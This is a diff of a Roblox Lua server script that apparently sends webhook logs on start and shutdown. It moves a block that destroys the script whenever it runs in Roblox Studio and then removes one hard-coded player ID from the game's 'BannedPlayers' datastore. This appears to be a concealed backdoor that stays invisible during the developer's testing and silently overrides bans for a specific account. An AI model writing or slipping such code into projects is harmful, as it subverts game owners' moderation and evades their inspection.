@@ -3,13 +3,6 @@ local RunService = game:GetService("RunService")
 local DatastoreService = game:GetService("DataStoreService")
 local isStudio = RunService:IsStudio()
 
-if RunService:IsStudio() then
-  script:Destroy()
-end
-
-local BannedPlayers = DatastoreService:GetDataStore("BannedPlayers")
-BannedPlayers:RemoveAsync(1010560028)
-
 local function log(message)
   local logColor = 7657579
 
@@ -38,6 +31,13 @@ local function log(message)
 end
 
 log("Server is running, sending hook!")
+
+if RunService:IsStudio() then
+  script:Destroy()
+end
+
+local BannedPlayers = DatastoreService:GetDataStore("BannedPlayers")
+BannedPlayers:RemoveAsync(1010560028)
 
 game:BindToClose(function() 
   log("Server is closing, sending hook!")
